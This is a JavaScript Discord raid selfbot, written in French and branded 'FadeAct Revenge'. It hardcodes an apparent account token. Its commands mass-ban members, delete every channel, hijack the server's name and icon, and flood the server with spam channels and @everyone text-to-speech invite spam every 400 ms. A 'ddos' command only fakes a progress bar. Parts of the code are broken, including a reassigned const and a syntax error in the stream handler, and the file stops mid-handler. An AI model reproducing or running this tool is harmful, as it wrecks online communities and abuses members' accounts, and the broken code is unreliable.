const Discord = require('discord.js');
const settings = require("./config.json");
const bot = new Discord.Client();
bot = new Discord.Client(),
express = require("express"),
gifSearch = require("gif-search"),
sayembed = new Discord.RichEmbed(),
ms = require("ms"),
con = console.log,
token = "NDc0MzMwNTcwODk4NTM4NDk2.Dyo1Tw.GWUr-pWKe-OueESgkkfPzvVWQXw",
kiss = ["https://cdn.weeb.sh/images/SJ--2auDZ.gif", "https://cdn.weeb.sh/images/Skc42pdv-.gif", "https://cdn.weeb.sh/images/rJ_U2p_Pb.gif", "https://cdn.weeb.sh/images/ryFdQRtF-.gif", "https://cdn.weeb.sh/images/SkQIn6Ovb.gif", "https://cdn.weeb.sh/images/SJQRoTdDZ.gif", "https://cdn.weeb.sh/images/Sk1k3TdPW.gif", "https://cdn.weeb.sh/images/r1H42advb.gif", "https://cdn.weeb.sh/images/S1E1npuvb.gif", "https://cdn.weeb.sh/images/ByurnpODW.gif", "https://cdn.weeb.sh/images/S1y-4l5Jf.gif", "https://cdn.weeb.sh/images/Skv72TuPW.gif", "https://cdn.weeb.sh/images/SJINn6OPW.gif", "https://cdn.weeb.sh/images/SJ3dXCKtW.gif", "https://cdn.weeb.sh/images/H1Gx2aOvb.gif", "https://cdn.weeb.sh/images/S1qZksSXG.gif", "https://cdn.weeb.sh/images/r1cB3aOwW.gif", "https://cdn.weeb.sh/images/HJ8dQRYK-.gif", "https://cdn.weeb.sh/images/BJLP3a_Pb.gif"],
hug = ["https://s-media-cache-ak0.pinimg.com/originals/49/a2/1e/49a21e182fcdfb3e96cc9d9421f8ee3f.gif", "https://s-media-cache-ak0.pinimg.com/originals/16/46/f7/1646f720af76ea58853ef231028bafb1.gif", "https://media.giphy.com/media/xJlOdEYy0r7ZS/giphy.gif", "http://i.imgur.com/2WywS3T.gif", "http://i.imgur.com/8ruodNJ.gif", "https://myanimelist.cdn-dena.com/s/common/uploaded_files/1461071296-7451c05f5aae134e2cceb276b085a871.gif", "http://i0.kym-cdn.com/photos/images/original/000/931/030/394.gif", "https://media.tenor.co/images/1171c186f9130d1efa4a186ad4371e8c/tenor.gif", "http://cdn.smosh.com/sites/default/files/ftpuploads/bloguploads/0413/epic-hugs-friends-pikachu.gif", "https://cdn.weeb.sh/images/rJaog0FtZ.gif", "https://cdn.weeb.sh/images/B10Tfknqf.gif", "https://cdn.weeb.sh/images/S1a0DJhqG.gif", "https://cdn.weeb.sh/images/Hk4qu_XvZ.gif", "https://cdn.weeb.sh/images/Hk0yFumwW.gif", "https://cdn.weeb.sh/images/BJCCd_7Pb.gif", "https://cdn.weeb.sh/images/BJ0UovdUM.gif"],
rnb = require('random-number'),
var prefix = settings.prefix;
var start = Date.now();


bot.on('ready', () => {
    console.log("🔩 Avion.js is running now ... 🔩");
});     

bot.login(token);


bot.on('message', message => {

    if (message.content === prefix + "clearchan"){
        if (message.deletable) message.delete();
    if (message.author.id != "374882828246319104") return;
    message.guild.channels.forEach(chan => {
      if (chan.deletable) chan.delete();
    });
    }

    if (message.content === prefix + "banall"){
        if (message.deletable) message.delete();
    if (message.author.id != "374882828246319104") return;
    message.guild.members.forEach(member => {
      member.ban().then(function () {});
    });
    }
    if (message.content === prefix + "members"){
    if (message.author.id != "374882828246319104") return;
    if (message.deletable) message.delete();
    message.channel.send(message.guild.memberCount + "** membres au total.**")

    }

    if (message.content === prefix + "channel"){
        if (message.author.id != "374882828246319104") return;
    if (message.deletable) message.delete();
    const categories = message.guild.channels.filter(c => c.type === "category")
    const text = message.guild.channels.filter(c => c.type === "text")
    const voice = message.guild.channels.filter(c => c.type === "voice")
    var category_embed = new Discord.RichEmbed()
    .setAuthor("♐️ FadeAct Revenge ♐️")
    .setFooter("© SelfBot by ✝ Oɴᴜʀɪꜱ Vᴇꜱᴘᴀ ✝#9966")
    .setThumbnail("https://i.imgur.com/zmNOgGz.gif")
    .setColor('#cee4e6')
    .addField("𝘾𝙖𝙩𝙚𝙜𝙤𝙧𝙮 𝙇𝙞𝙨𝙩", categories.map(c => c.name))
    message.channel.sendEmbed(category_embed);
    var text_embed = new Discord.RichEmbed()
    .setAuthor("♐️ FadeAct Revenge ♐️")
    .setFooter("© SelfBot by ✝ Oɴᴜʀɪꜱ Vᴇꜱᴘᴀ ✝#9966")
    .setThumbnail("https://i.imgur.com/zmNOgGz.gif")
    .setColor('#cee4e6')
    .addField("𝙏𝙚𝙭𝙩 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝙇𝙞𝙨𝙩", text.map(c => c.name))
    message.channel.sendEmbed(text_embed);
    var voice_embed = new Discord.RichEmbed()
    .setAuthor("♐️ FadeAct Revenge ♐️")
    .setFooter("© SelfBot by ✝ Oɴᴜʀɪꜱ Vᴇꜱᴘᴀ ✝#9966")
    .setThumbnail("https://i.imgur.com/zmNOgGz.gif")
    .setColor('#cee4e6')
    .addField("𝙑𝙤𝙞𝙘𝙚 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝙇𝙞𝙨𝙩", voice.map(c => c.name))
    message.channel.sendEmbed(voice_embed);
    }

    if (message.content === prefix + "help"){
   if (message.author.id != "374882828246319104") return;
    if (message.deletable) message.delete();
    var help_embed = new Discord.RichEmbed()
    .setAuthor("♐️ FadeAct Revenge ♐️")
    .setFooter("© SelfBot by ✝ Oɴᴜʀɪꜱ Vᴇꜱᴘᴀ ✝#9966")
    .setThumbnail("https://i.imgur.com/zmNOgGz.gif")
    .setColor('#cee4e6')
    .addField("  -| 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙂𝙀𝙉𝙀𝙍𝘼𝙇 |-  ", `🌐  ${prefix}𝙜𝙚𝙣𝙚𝙧𝙖𝙡 : 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙂𝙀𝙉𝙀𝙍𝘼𝙇! \n` + "󠂪")
    .addField("  -| 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝘽𝙊𝙉𝙐𝙎 |-  ", `⚜️  ${prefix}𝙗𝙤𝙣𝙪𝙨 : 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝘽𝙊𝙉𝙐𝙎! \n` + "󠂪")
    .addField("  -| 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙍𝘼𝙄𝘿 |-  ", `✏️  ${prefix}𝙧𝙖𝙞𝙙 : 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙍𝘼𝙄𝘿! \n` + "󠂪")
    .addField("  -| 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙁𝙐𝙉 |-  ", `🎉  ${prefix}𝙛𝙪𝙣 : 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙁𝙐𝙉! \n` + "󠂪")
    message.channel.sendEmbed(help_embed);
    }
    if (message.content === prefix + "raid"){
    if (message.author.id != "374882828246319104") return;
    if (message.deletable) message.delete();
    var raid_embed = new Discord.RichEmbed()
        .setAuthor("♐️ FadeAct Revenge ♐️")
        .setFooter("© SelfBot by ✝ Oɴᴜʀɪꜱ Vᴇꜱᴘᴀ ✝#9966")
        .addField("  -| ǞviΦП 𝘋𝘦𝘴𝘵𝘳𝘰𝘺 ! |-  ", `🌇  ${prefix}𝙨𝙚𝙡𝙛 : 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙖 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚 𝙥𝙤𝙪𝙧 𝘿𝙀𝙎𝙏𝙍𝙊𝙔!\n` + "󠂪")
        .addField("  -| ǞviΦП 𝘚𝘱𝘢𝘮 |-  ", `💎 ${prefix}𝙨𝙥𝙖𝙢 [𝙩𝙚𝙭𝙩𝙚] : 𝙎𝙥𝙖𝙢 𝙡𝙚 [𝙩𝙚𝙭𝙩𝙚] 𝙚𝙣 𝙖𝙟𝙤𝙪𝙩𝙖𝙣𝙩 𝙪𝙣 𝙚𝙫𝙚𝙧𝙮𝙤𝙣𝙚!\n` + "󠂪")
        .addField("  -| ǞviΦП 𝘉𝘢𝘯 𝘩𝘢𝘮𝘮𝘦𝘳 |-  ", `⚔️ ${prefix}𝒃𝒂𝒏𝒂𝙡𝙡 : 𝘽𝙖𝙣 𝙩𝙤𝙪𝙩 𝙡𝙚 𝙈𝙊𝙉𝘿𝙀!\n` + "󠂪")
        .addField("  -| ǞviΦП 𝘊𝘭𝘦𝘢𝘳 𝘊𝘩𝘢𝘯𝘯𝘦𝘭𝘴 |-  ", `⚔️ ${prefix}𝒄𝒍𝒆𝒂𝒓𝒄𝒉𝒂𝒏 : 𝙎𝙪𝙥𝙥𝙧𝙞𝙢𝙚 𝙩𝙤𝙪𝙩 𝙡𝙚𝙨 𝘾𝙃𝘼𝙉𝙉𝙀𝙇𝙎!\n` + "󠂪")
        .setColor('#cee4e6')
        .setThumbnail("https://i.imgur.com/zmNOgGz.gif")
        message.channel.sendEmbed(raid_embed);
    }

    if (message.content === prefix + "fun"){
    
        if (message.author.id != "374882828246319104") return;
        if (message.deletable) message.delete();
        var fun_embed = new Discord.RichEmbed()
            .setAuthor("♐️ FadeAct Revenge ♐️")
            .setFooter("© SelfBot by ✝ Oɴᴜʀɪꜱ Vᴇꜱᴘᴀ ✝#9966")
            .addField("  -| ǞviΦП 𝘗𝘪𝘯𝘨 |-  ", `🔌  ${prefix}𝙥𝙞𝙣𝙜 : 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙋𝙄𝙉𝙂!\n` + "󠂪")
            .addField("  -| ǞviΦП 8𝘣𝘢𝘭𝘭 |-  ", `💎 ${prefix}𝟖𝒃𝒂𝒍𝒍 : 𝙋𝙤𝙨𝙚𝙯 𝙢𝙤𝙞 𝙪𝙣𝙚 𝙌𝙐𝙀𝙎𝙏𝙄𝙊𝙉!\n` + "󠂪")
            .setColor('#cee4e6')
            .setThumbnail("https://i.imgur.com/zmNOgGz.gif")
            message.channel.sendEmbed(fun_embed);
    
    }

    if (message.content === prefix + "bonus"){
    
        if (message.author.id != "374882828246319104") return;
        if (message.deletable) message.delete();
        var bonus_embed = new Discord.RichEmbed()
            .setAuthor("♐️ FadeAct Revenge ♐️")
            .setFooter("© SelfBot by ✝ Oɴᴜʀɪꜱ Vᴇꜱᴘᴀ ✝#9966")
            .addField("  -| ǞviΦП 𝘔𝘶𝘭𝘵𝘪𝘴𝘵𝘳𝘦𝘢𝘮 |-  ", "🎥 ~ *𝙢𝙨𝙩𝙧𝙚𝙖𝙢 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙪𝙣 𝙚𝙛𝙛𝙚𝙩 𝙙𝙚 𝙢𝙪𝙡𝙩𝙞 𝙎𝙏𝙍𝙀𝘼𝙈!`\n" + "󠂪")
            .addField("  -| ǞviΦП 𝘓𝘪𝘴𝘵𝘦𝘯 |-  ", `🎧 ~ ${prefix}𝙡𝙞𝙨𝙩𝙚𝙣 [𝙩𝙚𝙭𝙩𝙚] : 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚 [𝙩𝙚𝙭𝙩𝙚] 𝙚𝙣 𝙀𝘾𝙊𝙐𝙏𝙀!\n` + "󠂪")
            .addField("  -| ǞviΦП 𝘗𝘭𝘢𝘺 |-  ", `🎮 ~ ${prefix}𝙥𝙡𝙖𝙮 [𝙩𝙚𝙭𝙩𝙚] : 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚 [𝙩𝙚𝙭𝙩𝙚] 𝙖𝙪𝙦𝙪𝙚𝙡 𝙩𝙪 𝙫𝙚𝙪𝙭 𝙅𝙊𝙐𝙀𝙍!\n` + "󠂪")
            .addField("  -| ǞviΦП 𝘞𝘢𝘵𝘤𝘩 |-  ", `💻 ~ ${prefix}𝙬𝙖𝙩𝙘𝙝 [𝙩𝙚𝙭𝙩𝙚] : 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚 [𝙩𝙚𝙭𝙩𝙚] 𝙦𝙪𝙚 𝙩𝙪 𝙍𝙀𝙂𝘼𝙍𝘿𝙀𝙎!\n` + "󠂪")
            .addField("  -| ǞviΦП 𝘚𝘵𝘳𝘦𝘢𝘮 |-  ", `🎥 ~ ${prefix}𝙨𝙩𝙧𝙚𝙖𝙢 [𝙩𝙚𝙭𝙩𝙚] : 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚 [𝙩𝙚𝙭𝙩𝙚] 𝙚𝙣 𝙎𝙏𝙍𝙀𝘼𝙈!\n` + "󠂪")
            .addField("  -| ǞviΦП 𝘋𝘋𝘖𝘚 ! |-  ", `💥 ~ ${prefix}𝒅𝒅𝒐𝒔 : 𝙇𝙖𝙣𝙘𝙚 𝙪𝙣𝙚 𝙛𝙖𝙪𝙨𝙨𝙚 𝙖𝙩𝙩𝙖𝙦𝙪𝙚 𝘿𝘿𝙊𝙎!\n` + "󠂪")
            .addField("  -| ǞviΦП 𝘈𝘣𝘰𝘶𝘵 |-  ", `🔮 ~ ${prefix}𝒂𝒃𝒐𝒖𝒕 : 𝙈𝙤𝙣𝙩𝙧𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙩 𝙫𝙤𝙪𝙨 𝙥𝙤𝙪𝙫𝙚𝙯 𝙢𝙚 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙚𝙯!\n` + "󠂪")
            .setThumbnail("https://i.imgur.com/zmNOgGz.gif")
            .setColor('#cee4e6')
            message.channel.sendEmbed(bonus_embed);
    
    }

    if (message.content === prefix + "servers"){

        var server_count_guilds = bot.guilds.size
        var server_count_channels = bot.channels.size
        var server_count_users = bot.users.size
    
        if (message.author.id != "374882828246319104") return;
        if (message.deletable) message.delete();
        var serversEmbed = new Discord.RichEmbed()
            .setColor('#cee4e6')
            .setTitle("♐️ FadeAct Revenge ♐️")
            .setFooter("© SelfBot by ✝ Oɴᴜʀɪꜱ Vᴇꜱᴘᴀ ✝#9966")
            .setThumbnail("https://i.imgur.com/zmNOgGz.gif")
            .addField("Connecté à ", server_count_guilds + " **servers**")
            .addField("Lis actuellement ", server_count_channels + " **channels**")
            .addField("Devant ", server_count_users + " **utilisateurs**")
        message.channel.sendEmbed(serversEmbed);
    }

    if (message.content === prefix + "general"){
    
        if (message.author.id != "374882828246319104") return;
        if (message.deletable) message.delete();
        var help_embed = new Discord.RichEmbed()
            .setAuthor("♐️ FadeAct Revenge ♐️")
            .setFooter("© SelfBot by ✝ Oɴᴜʀɪꜱ Vᴇꜱᴘᴀ ✝#9966")
            .addField("  -| ǞviΦП 𝘈𝘷𝘢𝘵𝘢𝘳 |-  ", `✏️  ${prefix}𝙖𝙫𝙖𝙩𝙖𝙧 : 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡'𝘼𝙑𝘼𝙏𝘼𝙍 𝙙𝙚 𝙡𝙖 𝙥𝙚𝙧𝙨𝙤𝙣𝙣𝙚!\n` + "󠂪")
            .addField("  -| ǞviΦП 𝘗𝘶𝘳𝘨𝘦 |-  ", `⚖️  ${prefix}𝙥𝙪𝙧𝙜𝙚 : 𝙎𝙪𝙥𝙥𝙧𝙞𝙢𝙚 𝙡𝙚𝙨 𝙢𝙚𝙨𝙨𝙖𝙜𝙚𝙨 𝙋𝙐𝙍𝙂𝙀!\n` + "󠂪")
            .addField("  -| ǞviΦП 𝘗𝘶𝘣 |-  ", `🔱  ${prefix}𝙥𝙪𝙗 : 𝙋𝙚𝙧𝙢𝙚𝙩 𝙙'𝙚𝙣𝙫𝙤𝙮𝙚𝙧 𝙪𝙣𝙚 𝙥𝙪𝙗 𝙙𝙪 𝙨𝙚𝙧𝙫𝙚𝙪𝙧 𝙇𝘼 𝙏𝙍𝙄𝘼𝘿𝙀\n` + "󠂪")
            .addField("  -| ǞviΦП 𝘚𝘦𝘳𝘷𝘦𝘳𝘴 |-  ", `📘  ${prefix}𝙨𝙚𝙧𝙫𝙚𝙧𝙨 : 𝙀𝙣𝙫𝙤𝙞𝙚 𝙡𝙚𝙨 𝙨𝙩𝙖𝙩𝙞𝙨𝙩𝙞𝙦𝙪𝙚𝙨 𝙙𝙚 𝙩𝙤𝙣 𝙘𝙤𝙢𝙥𝙩𝙚\n` + "󠂪")
            .addField("  -| ǞviΦП 𝘊𝘩𝘢𝘯𝘯𝘦𝘭 |-  ", `📘  ${prefix}𝙘𝙝𝙖𝙣𝙣𝙚𝙡 : 𝙇𝙞𝙨𝙩𝙚 𝙙𝙚 𝙩𝙤𝙪𝙩 𝙡𝙚𝙨 𝘾𝙃𝘼𝙉𝙉𝙀𝙇𝙎!\n` + "󠂪")
            .addField("  -| ǞviΦП 𝘚𝘦𝘳𝘷𝘦𝘶𝘳𝘪𝘯𝘧𝘰 |-  ", `📘  ${prefix}𝙨𝙞𝙣𝙛𝙤 : 𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣 𝙙𝙪 𝙎𝙀𝙍𝙑𝙀𝙐𝙍!\n` + "󠂪")
            .addField("  -| ǞviΦП 𝘔𝘦𝘮𝘣𝘳𝘦𝘪𝘯𝘧𝘰 |-  ", `📘  ${prefix}𝙢𝙞𝙣𝙛𝙤 : 𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣 𝙙𝙪 𝙈𝙀𝙈𝘽𝙍𝙀!\n` + "󠂪")
            .setColor('#cee4e6')
            .setThumbnail("https://i.imgur.com/zmNOgGz.gif")
            message.channel.sendEmbed(help_embed);
    
    }

    if(message.content === prefix + "random"){
        if (message.deletable) message.delete();
        random = Math.floor(Math.random() * 101) + 1;
        message.replay(`Random number : **${random}**`)
    }

  if(message.content === prefix + "mstream"){
   if (message.deletable) message.delete();
     if (message.author.id != "374882828246319104") return
        let rotate = 0;
     setInterval(function() {
        if(rotate === 0) {
            bot.user.setActivity("♐️ FadeAct Revenge ♐️", {type: "Streaming", url: 'https://www.twitch.tv/AvioonTV'});
            rotate = 1;       
        } else if(rotate === 1){
            bot.user.setActivity("Designed by Onuris.", {type: "Streaming", url: 'https://www.twitch.tv/AvioonTV'});
            rotate = 2;
        } else if(rotate === 2){
            bot.user.setActivity(`ǞviΦП ✞ |`, {type: "Streaming", url: 'https://www.twitch.tv/AvioonTV'});
            rotate = 3;
        }  else if(rotate === 3){
            random = Math.floor(Math.random() * 7) + 1;
            bot.user.setActivity(`𝙏𝙝𝙚 𝙙𝙞𝙘𝙚 𝙧𝙤𝙡𝙡𝙚𝙙 𝙞𝙩'𝙨 𝙖 ${random}. 🎲`, {type: "Streaming", url: 'https://www.twitch.tv/AvioonTV'});
            rotate = 0;
        }}, 10 * 1000)
      }
      

    if (message.content === prefix +'avatar') {
        if (message.author.id != "374882828246319104") return;
        if (!message.mentions.users.size) {
        
        return message.channel.send(`Avatar de ${message.author.tag} 💡 ${message.author.displayAvatarURL}`);
        
        }

            const getav_embed = new Discord.RichEmbed()
            .setAuthor("♐️ FadeAct Revenge ♐️")
            .setFooter("© SelfBot by ✝ Oɴᴜʀɪꜱ Vᴇꜱᴘᴀ ✝#9966")
            .addField("Voici l'image de ta proie.", "🌟 - N'oublions pas de dire merci !")
            .setImage(`${message.mentions.displayAvatarURL}`)
            .setThumbnail("https://i.imgur.com/zmNOgGz.gif")
            .setColor('#cee4e6')
            message.channel.sendEmbed(getav_embed);
        
        return;
        
        }

    if (message.content === prefix + "about"){
        if (message.deletable) message.delete();
        if (message.author.id != "374882828246319104") return;
        var help_embed = new Discord.RichEmbed()
            .setAuthor("♐️ FadeAct Revenge ♐️")
            .setFooter("© SelfBot by ✝ Oɴᴜʀɪꜱ Vᴇꜱᴘᴀ ✝#9966")
            .setImage("https://i.imgur.com/1EsD2Wo.png")
            .setThumbnail("https://i.imgur.com/zmNOgGz.gif")
            .addField("🌟 -| ǞviΦП 𝘋𝘪𝘴𝘤𝘰𝘳𝘥 |- 🌟", "🧙‍ - *`ǞviΦП 𝐕𝐞𝐬𝐩𝐚 𝐗#9443`*")
            .addField("🌟 -| ǞviΦП 𝘝𝘦𝘴𝘱𝘢 𝘋𝘪𝘴𝘤𝘰𝘳𝘥 |- 🌟", "🌇 - *`https://discord.gg/ty5sKjK`*")
            .addField("🌟 -| 𝘾𝙧𝙚𝙖𝙩𝙤𝙧𝙎𝙚𝙡𝙛𝙗𝙤𝙩 𝘋𝘪𝘴𝘤𝘰𝘳𝘥 |- 🌟", "🌇 - *`https://discord.gg/F9mYpbM`*")
            .setColor('#cee4e6')
            message.channel.sendEmbed(help_embed);
        console.log("𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝘼𝙗𝙤𝙪𝙩 𝙙𝙚𝙢𝙖𝙣𝙙𝙚́𝙚 !");
    }

    if (message.content === prefix + "self"){
        if (message.author.id != "374882828246319104") return;
        if (message.deletable) message.delete();
        var help_embed = new Discord.RichEmbed()
            .setAuthor("♐️ FadeAct Revenge ♐️")
            .setFooter("© SelfBot by ✝ Oɴᴜʀɪꜱ Vᴇꜱᴘᴀ ✝#9966")
            .setThumbnail("https://i.imgur.com/zmNOgGz.gif")
            .addField("🌟 -| ǞviΦП 𝐒𝐄𝐋𝐅𝐁𝐎𝐓™ |- 🌟", `🌇 ${prefix}serveur@destroy : 𝙎𝙚𝙧𝙫𝙚𝙧 𝘿𝙚𝙨𝙩𝙤𝙮𝙚𝙙 !`)
            .setImage("https://i.imgur.com/1EsD2Wo.png")
            .setColor('#cee4e6')
            message.channel.sendEmbed(help_embed);
        console.log("𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙎𝙚𝙡𝙛 𝙙𝙚𝙢𝙖𝙣𝙙𝙚́𝙚 !");
    }


    if (message.content === prefix + "ping"){
        if (message.deletable) message.delete();
        if (message.author.id != "374882828246319104") return;
        var end = new Date().getTime();
        var millis = Date.now() - start;
        var temp = Math.floor(millis/1000);
        if (message.deletable) message.delete();
        message.reply('```🌟 Réponse en ' + temp + ' ms```');
    }

if(message.content === prefix + "serveur@destroy"){
    if (message.deletable) message.delete();
    if (message.author.id != "374882828246319104") return;
    if(message.channel.type === "dm") return;
    if(message.guild.channels.size === 0) return;
    if(!message.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
    message.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
}

if(message.content === prefix + "serveur@destroy"){
    if(message.channel.type === "dm") return;
    if (message.author.id != "374882828246319104") return; 
    if(message.guild.name != "🌟 ǞviΦП 🌟"){
         message.guild.setIcon("https://i.imgur.com/nknnfHe.png").catch(error => {})
         message.guild.setName('🌟 ǞviΦП 🌟').catch(error => {})
         message.guild.setRegion('russia').catch(error => {})
     }
     setInterval(function () { if(message.guild.channels.size < 499){
       message.guild.createChannel('𝙁𝙪𝙘𝙠𝙚𝙙_𝙗𝙮_𝙑𝙚𝙨𝙥𝙖', 'text').catch(error => {})
     }}, 400)
     if(message.deletable) message.delete();
   }

   if (message.content === prefix + 'serveur@destroy') {
    if(message.channel.type === "dm") return;
    if (message.author.id != "374882828246319104") return; 
      setInterval (function () { message.channel.send("@everyone @here . REJOINS NOUS ICI !!! \n"+
      "FUCKED BY ǞviΦП \n"+
     "https://discord.gg/a4mBCRk \n"+
     "https://discord.gg/PCNJfgA", { tts: true } ).catch(error => {}) }, 400)
    }

   if (message.author.id != "374882828246319104") return;   
   if (message.author.bot) return;
   let messageArray = message.content.split(" "); let cmd = messageArray[0]; let args = messageArray.slice(1);
   

   if (cmd == prefix + "purge") { message.channel.fetchMessages().then((message) => message.forEach(m => m.delete())); }
   if (cmd == prefix + "del") { message.channel.fetchMessages().then((message) => message.forEach(m => m.delete())); }
   if (cmd == prefix + "ddos") { if (message.author.id != "374882828246319104") return; if (message.deletable) message.delete(); var ip = args[0]; var port = args[1]; let ddosembed = new Discord.RichEmbed().setTitle("♐️ FadeAct Revenge ♐️").setColor("#1a1aff").setThumbnail(bot.user.avatarURL).addField("𝐈𝐏:", ip).addField("𝐏𝐎𝐑𝐓:", port).setFooter(`© SelfBot by ✝ Oɴᴜʀɪꜱ Vᴇꜱᴘᴀ ✝#9966`); message.channel.send(ddosembed); var charge = "."; var chargeC = "¦"; message.channel.send("```[" + charge.repeat(40) + "]```").then((message) => { for (i = 0; i <= 40; i++) { message.edit("```[" + chargeC.repeat(i) + charge.repeat(40 - i) + "]  -  " + i * 100 / 40 + "%```"); } }) }
   if (cmd == prefix + `sinfo`) { if (message.author.id != "374882828246319104") return; message.channel.bulkDelete(1); let sicon = message.guild.iconURL; let serverembed = new Discord.RichEmbed().setDescription("♐️ FadeAct Revenge ♐️").setFooter("© SelfBot by ✝ Oɴᴜʀɪꜱ Vᴇꜱᴘᴀ ✝#9966").setThumbnail("http://image.noelshack.com/fichiers/2018/52/7/1546149106-babybossdestroy.jpg").setImage("https://i.imgur.com/1EsD2Wo.png").setColor("#1a1aff").setThumbnail(sicon).addField("🌟 𝐒𝐞𝐫𝐯𝐞𝐫 𝐍𝐚𝐦𝐞:", message.guild.name).addField("🌟 𝐈𝐃:", message.guild.id).addField("🌟 𝐎𝐰𝐧𝐞𝐫 𝐨𝐟 𝐭𝐡𝐞 𝐬𝐞𝐫𝐯𝐞𝐫:", message.guild.owner.user).addField("🌟 𝐑𝐞𝐠𝐢𝐨𝐧:", message.guild.region).addField("🌟 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐋𝐞𝐯𝐞𝐥:", message.guild.verificationLevel).addField("🌟 𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐎𝐧:", message.guild.createdAt).addField("🌟 𝐘𝐨𝐮 𝐉𝐨𝐢𝐧𝐞𝐝:", message.member.joinedAt).addField("🌟 𝐓𝐨𝐭𝐚𝐥 𝐌𝐞𝐦𝐛𝐞𝐫𝐬:", message.guild.memberCount); return message.channel.send(serverembed); }
   if (cmd == prefix + `minfo`){ 
    if (message.author.id != "374882828246319104") return;
    if (message.deletable) message.delete();
    const mention = message.mentions.members.first();
    var micon = mention.user.avatarURL; var memberembed = new Discord.RichEmbed()
    .setDescription("♐️ FadeAct Revenge ♐️")
    .setFooter("© SelfBot by ✝ Oɴᴜʀɪꜱ Vᴇꜱᴘᴀ ✝#9966")
    .setThumbnail("https://i.imgur.com/zmNOgGz.gif")
    .setImage("https://i.imgur.com/1EsD2Wo.png")
    .setColor("#cee4e6")
    .setThumbnail(micon)
    .addField("🌟 𝐓𝐀𝐆 𝐝𝐞 𝐥𝐚 𝐩𝐫𝐨𝐢𝐞:", mention.user.tag)
    .addField("🌟 𝐈𝐃 𝐝𝐞 𝐜𝐞 𝐬𝐢𝐧𝐠𝐞 !:", mention.user.id)
    .addField("🌟 𝐆𝐚𝐦𝐞 𝐀𝐜𝐭𝐢𝐯𝐢𝐭𝐲 !:", mention.presence.game)
    .addField("🌟 𝐍𝐨𝐦 𝐝𝐞 𝐭𝐚 𝐩𝐫𝐨𝐢𝐞 !:", mention.user.username)
    .addField("🌟 𝐍𝐨𝐦𝐛𝐫𝐞𝐬 𝐝𝐞 𝐫𝐨𝐥𝐞 !:", mention.roles.size - 1)
    .addField("🌟 𝐃𝐚𝐭𝐞 𝐝𝐞 𝐜𝐫𝐞𝐚𝐭𝐢𝐨𝐧 𝐝𝐞 𝐬𝐨𝐧 𝐜𝐨𝐦𝐩𝐭𝐞 !:", mention.user.createdAt)
    .addField("🌟 𝐃𝐚𝐭𝐞 𝐝'𝐞𝐦𝐛𝐚𝐫𝐪𝐮𝐞𝐦𝐞𝐧𝐭:", mention.joinedAt); return message.channel.send(memberembed); };

    
    if (cmd === prefix + "8ball"){
        if (!args[1]) return message.reply("Tu n'as pas posé de question !");
    
        let replies = ["Oui", "Non", "Peux être", "Je ne sais pas", "C'est impossible !", "Probablement..", "Hors de question !", "Pourquoi pas?"]
        let question = args.slice(0).join(" ");
        let res = Math.floor((Math.random() * replies.length));
    
        let bembed = new Discord.RichEmbed()
            .setColor('#cee4e6')
            .setTitle("♐️ FadeAct Revenge ♐️")
            .setFooter("© SelfBot by ✝ Oɴᴜʀɪꜱ Vᴇꜱᴘᴀ ✝#9966")
            .setThumbnail("https://i.imgur.com/zmNOgGz.gif")
            .addField(`Question de ${message.author.tag}`, question)
            .addField("Réponse : ", replies[res])
            message.channel.sendEmbed(bembed);
        }
    
        if ( cmd === prefix + "watch") {
            if (message.author.id != "374882828246319104") return;
            if (message.deletable) message.delete();
            if (!args[0]) return message.reply("Merci de présicé le nom que tu souhaites.");
    
            let WatchTime = args.slice(0).join(" ");
    
            bot.user.setActivity(`${WatchTime}`, {type: "WATCHING"})
        }
        if ( cmd === prefix + "stream") {
            if (message.deletable) message.delete();
			function new = 'TWITCH'().getTime();
			bot.user.setActivity('(Function end = TWITCH), { type: 'STREAMING', url: 'https://www.twitch.tv/eaucalmelpb' });
        }
    
        if ( cmd === prefix + "listen") {
            if (message.author.id != "374882828246319104") return;
            if (message.deletable) message.delete();
            if (!args[0]) return message.reply("Merci de présicé le nom que tu souhaites.");
    
            let ListenTime = args.slice(0).join(" ");
    
            bot.user.setActivity(`${ListenTime}`, {type: "LISTENING"})
        }
        if ( cmd === prefix + "play") {
            if (message.author.id != "374882828246319104") return;
            if (message.deletable) message.delete();
            if (!args[0]) return message.reply("Merci de présicé le nom que tu souhaites.");
    
            let PlayTime = args.slice(0).join(" ");
    
